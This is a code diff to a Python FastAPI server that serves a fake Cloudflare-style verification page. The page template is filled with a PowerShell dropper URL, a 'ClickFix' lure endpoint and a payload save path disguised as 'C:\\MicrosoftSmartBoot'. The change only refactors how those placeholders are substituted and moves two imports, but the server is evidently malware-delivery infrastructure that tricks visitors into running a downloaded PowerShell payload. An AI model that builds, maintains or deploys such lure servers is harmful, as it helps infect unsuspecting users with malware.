@@ -5,6 +5,8 @@ import asyncio
 import aiofiles
 import config
 from fastapi.middleware.cors import CORSMiddleware
+import os
+import colorama
 
 
 
@@ -51,10 +53,14 @@ async def root_route(req:Request):
 
     async with aiofiles.open(config.conf["PATHS"]["cloudflare_page"],encoding="utf-8") as f:
         html = await f.read()
-    html = html.replace("{{PSScript URL for IWR}}",config.conf["URLS"]["powershell_dropper_url"])
-    html = html.replace('{{CLICK_FIX_PAGE}}',config.conf["URLS"]["clickfix_page_endpoint"])
-    html = html.replace("{{Payload Save Path In UserDisk}}","C:\\\\MicrosoftSmartBoot")
-    html = html.replace("{{Fav-Icon-URL-Placeholder}}",config.conf["URLS"]["favicon_url"])
+    templates = {
+        "{{PSScript URL for IWR}}":config.conf["URLS"]["powershell_dropper_url"],
+        "{{CLICK_FIX_PAGE}}":config.conf["URLS"]["clickfix_page_endpoint"],
+        "{{Payload Save Path In UserDisk}}":"C:\\\\MicrosoftSmartBoot",
+        "{{Fav-Icon-URL-Placeholder}}":config.conf["URLS"]["favicon_url"],
+    }
+    for template,replacement in templates.items():
+        html = html.replace(template,replacement)
     if os.environ.get("VERBOSE_DEBUG",None):print(html)
     return HTMLResponse(
       html  
@@ -73,8 +79,6 @@ async def repair(req:Request):
 
 
 if __name__=="__main__":
-    import os
-    import colorama
     colorama.init()
     os.system(
         f"uvicorn {config.ServerFile.replace('.py','')}:app --port {config.DeployedPort} --host 0.0.0.0{"" if config.isDeployed else ' --reload'}"
